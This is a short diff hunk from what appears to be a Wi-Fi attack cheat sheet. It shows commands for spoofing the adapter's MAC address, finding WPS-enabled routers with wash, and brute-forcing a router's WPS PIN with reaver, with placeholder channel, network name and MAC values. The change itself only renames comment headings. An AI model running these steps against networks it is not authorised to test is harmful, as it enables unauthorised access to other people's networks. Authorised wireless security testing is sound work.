@@ -215,13 +215,10 @@ macchanger -a wlan1mon
 ifconfig wlan1mon up
 
 
-# Find only routers that have WPS enabled
-#########################################
+# WPS CRACKING (wifi protected setup)
+##############
 sudo wash -i wlan1mon
 	# Note the channel, BSSID (MAC) and ESSID (wifi name)
-
-# Run the WPS attack
-####################
 reaver -i wlan1mon -c 6 -e "MyWifi" -b 11:11:11:11:11:11 -vv
 	# -i	# Wireless monitor interface/adapter
 	# -c 6	# The router's channel (using 6 for example)
